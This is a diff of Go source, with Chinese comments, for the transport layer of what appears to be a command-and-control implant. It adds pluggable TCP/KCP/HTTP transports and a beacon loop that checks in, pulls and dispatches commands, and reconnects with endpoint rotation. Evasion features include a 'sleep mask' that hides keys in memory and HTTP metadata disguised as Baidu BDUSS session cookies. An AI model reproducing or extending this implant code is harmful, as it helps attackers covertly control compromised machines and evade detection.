@@ -28,8 +28,59 @@ type transportClient interface {
 	ReconnectMgr() *reconnect.ReconnectManager
 }
 
-// NewTransport 由各 transport 文件实现：构造并返回当前 build tag 对应的传输实例
+// httpGetMetadataPrepend 必须与服务端 config.Http_get_metadata_prepend 完全一致
+// （服务端用 strings.TrimPrefix 去掉它以取 MetaInfo）。http 与 https 共用，
+// 放在无 build tag 的共享文件里 —— 两个传输文件各自声明会在多传输构建下重名。
+const httpGetMetadataPrepend = "BDUSS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE; BDUSS_BFESS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE;SESSIONID="
+
+// ===== 传输注册表 =====
+//
+// 单传输构建：只有一个 transport 文件被编译，它的 init 把构造器注册进来。
+// 多传输构建（-tags transport_multi）：全部 12 个文件都编译，注册表里有全部构造器，
+// 由 multiTransport 按 endpoint 的 scheme 选择实现。
+
+// listenerType 当前传输类型（日志与 FirstBlood 用）。单传输构建由各 init 设为自身类型；
+// 多传输构建在每次 Connect 时更新为实际使用的 scheme。
+var listenerType = "tcp"
+
+var transportRegistry = map[string]func() transportClient{}
+
+// registerTransport 由各 transport 文件的 init 调用
+func registerTransport(name string, ctor func() transportClient) {
+	transportRegistry[name] = ctor
+}
+
+// newMultiTransportFn 仅多传输构建下由 transport_multi.go 赋值
+var newMultiTransportFn func() transportClient
+
+// NewTransport 构造传输实例：多传输构建返回调度器，单传输构建返回注册表里唯一那个
 // （TCP/KCP 等持久传输在 Connect 内完成心跳与密钥设置）。
+func NewTransport() transportClient {
+	if newMultiTransportFn != nil {
+		return newMultiTransportFn()
+	}
+	for _, ctor := range transportRegistry {
+		return ctor()
+	}
+	return nil
+}
+
+// underlyingProvider 由 multiTransport 实现：返回当前实际使用的传输，
+// 供 runloop 判断它是轮询型还是持久型（接口是静态的，multiTransport 自己
+// 不能"有时实现有时不实现"）。
+type underlyingProvider interface {
+	Underlying() transportClient
+}
+
+// activeTransport 解包多传输调度器
+func activeTransport(c transportClient) transportClient {
+	if up, ok := c.(underlyingProvider); ok {
+		if u := up.Underlying(); u != nil {
+			return u
+		}
+	}
+	return c
+}
 
 // runLoop 单二进制共享主循环（原各 adapter 重复的 runLoop 收敛于此）：
 // 连接 → 心跳 → 拉取命令 → 派发 → 空闲休眠；失败时指数退避重连并轮转 endpoint。
@@ -53,8 +104,9 @@ func runLoop() {
 				continue
 			}
 			communication.SetTransport(client)
-			// 持久传输在 Connect 内已启动心跳；轮询/独立心跳在此兜底启动
-			if hs, ok := client.(heartbeatStarter); ok {
+			// 持久传输在 Connect 内已启动心跳；轮询/独立心跳在此兜底启动。
+			// 多传输构建下要解包到实际传输再判断（调度器本身不实现心跳接口）。
+			if hs, ok := activeTransport(client).(heartbeatStarter); ok {
 				hs.StartHeartbeat()
 			}
 		}
@@ -80,7 +132,7 @@ func runLoop() {
 
 		// 空闲休眠：轮询型按 PollInterval，持久型按 WaitTime；**两者都走 sleep mask**
 		// （原实现持久型走无遮蔽的 SleepWithJitter，而长连接的密钥驻留时间最长）
-		if pt, ok := client.(pollTransport); ok {
+		if pt, ok := activeTransport(client).(pollTransport); ok {
 			interval := pt.PollInterval()
 			if interval < 1000*time.Millisecond {
 				interval = config.WaitTime // 防御：传输未给有效间隔时回退 sleep 基准
